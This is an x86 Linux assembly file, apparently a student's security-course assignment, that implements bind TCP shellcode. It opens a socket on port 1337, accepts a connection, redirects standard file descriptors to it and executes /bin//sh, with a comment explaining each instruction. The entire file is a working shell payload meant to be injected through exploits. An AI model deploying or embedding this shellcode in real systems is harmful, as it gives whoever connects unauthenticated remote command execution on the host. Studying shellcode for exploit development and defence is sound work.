;	Author: Shubham Singh
;	SLAE - 1342
;	Assignment 1: Bind TCP Shellcode / Linux x86
;
;

global _start

section .text
_start:
	;xor something with itself is 0
	xor eax,eax	; eax will become 0
	xor ebx, ebx 	; ebx will become 0
	cdq 		; edx will become 0

	; socket(AF_INET,SOCK_STREAM, 0)
	mov al, 102	; socketcall() syscall number is 102 in decimal 
	inc ebx		; ebx will be 1 now
	push edx	; 0 will be pushed on stack
	push byte 0x1	; SOCK_STREAM=1
	push byte 0x2	; AF_INET=2
	mov ecx, esp	; now ecx will have the value that points to top of the stack address
	int 0x80	; intrupt sys call, now access will go to kernel
	xchg esi, eax	; The return value of eax will be store in esi register which will be used as the file discripter.

	; bind(*fd, (2, port , 0), 16)
	xor eax, eax
	mov al, 0x66 	; socketcall() syscall number is 102 in decimal
	inc ebx		; ebx will be 2 now
	push edx	; push 0 on the stack
	push word 0x3905; push 1337 in hex on the stack
	push bx		; push 2 on the stack
	mov ecx, esp	; ecx will point to the esp
	push 0x10	; push 16 of decimal in hex on the stack
	push ecx	; push the address that ecx holds on the stack
	push esi	; push the fd address on the stack
	mov ecx, esp	; again ecx will point to the top of the stack
	int 0x80	; intrupt sys call

	; listen(*fd, number_of_listners)
	xor eax, eax
	mov al, 0x66 	; socketcall() syscall number is 102 in decimal
	inc ebx		; increase ebx by one, now ebx=3
	inc ebx		; increase ebx by one, now ebx=4
	push ebx	; push 4 on the stack for number of listners
	push esi	; push the file discripter address on the stack
	mov ecx, esp	; point top of the stack to ecx
	int 0x80	; intrupt sys call

	; accept(*fd, NULL , NULL)
	mov al, 102 ; socketcall() syscall number is 102 in decimal
	inc ebx	; increase ebx by one, now ebx=5
	push edx	; push 0 on the stack
	push edx	; push 0 on the stack
	push esi	; push the address of file discriptor on the stack
	mov ecx, esp	; point top of the stack to ecx
	int 0x80	; intrupt sys call

	xchg ebx, eax	; exchange the value of ebx and eax register values

	;dup and dup2	; duplicate the file descriptor
	xor ecx, ecx	; 0 the value of ecx register
	mov cl, 0x2	; move the value of 2 in lower ounter register
	loop:		;define the loop
	dec ecx		; decrement the value of cl register by 1
	mov al, 0x3f	; move the value 0x3f of hex in al register
	int 0x80	; intrupt the sys call
	jns loop	; jump if non sign

	; execve(const char *filename, char *const argv[],char *const envp[]);
	xor ecx, ecx	; 0 the ecx register
	push ecx	; push 0000 on the stack
	push byte 0x0b	; push 11 on the stack
	pop eax		; pop out the 11 in eax register
	push 0x68732f2f	; push sh\/\/ on the stack
	push 0x6e69622f	; push nib/ on the stack
	mov ebx, esp	; move the value of top of the stack register in ebx
	int 0x80	; intrut the sys call

